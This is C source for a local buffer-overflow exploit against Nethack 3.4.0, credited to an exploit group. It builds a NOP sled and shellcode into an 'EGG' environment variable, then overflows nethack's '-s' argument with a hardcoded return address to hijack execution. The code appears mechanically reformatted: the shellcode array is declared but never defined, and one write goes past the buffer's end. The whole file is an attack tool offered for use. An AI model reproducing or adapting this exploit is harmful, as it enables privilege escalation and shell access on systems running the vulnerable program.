
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int buf ;


 int execl (char*,char*,char*,char*,int *) ;
 int fprintf (int ,char*,...) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int) ;
 int putenv (char*) ;
 int * shellcode ;
 int stdout ;
 int strlen (int *) ;

int main ()
{
        unsigned long ret = 0xbffffd86;
        char buf[224];
        char smeg[1024];
        char *ptr;
  int i=0;
fprintf(stdout, "\n\tDSR-nethack.c By bob.\n");
fprintf(stdout, "Local Exploit for Nethack 3.4.0\n");
fprintf(stdout, "\tDSR-[www.dtors.net]-DSR\n");

memset(buf, 0x41, sizeof(buf));
        ptr = smeg;
        for (i = 0; i < 1024 - strlen(shellcode) -1; i++) *(ptr++) = 0x90;
        for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i];
        smeg[1024 - 1] = '\0';
        memcpy(smeg,"EGG=",4);
        putenv(smeg);
        buf[220] = (ret & 0x000000ff);
        buf[221] = (ret & 0x0000ff00) >> 8;
        buf[222] = (ret & 0x00ff0000) >> 16;
        buf[223] = (ret & 0xff000000) >> 24;
        buf[224] = '\0';

        fprintf(stdout,"ret: 0x%08x\n",ret);

        execl("/usr/games/lib/nethackdir/nethack", "nethack", "-s", buf,
((void*)0));
        return 0;
}
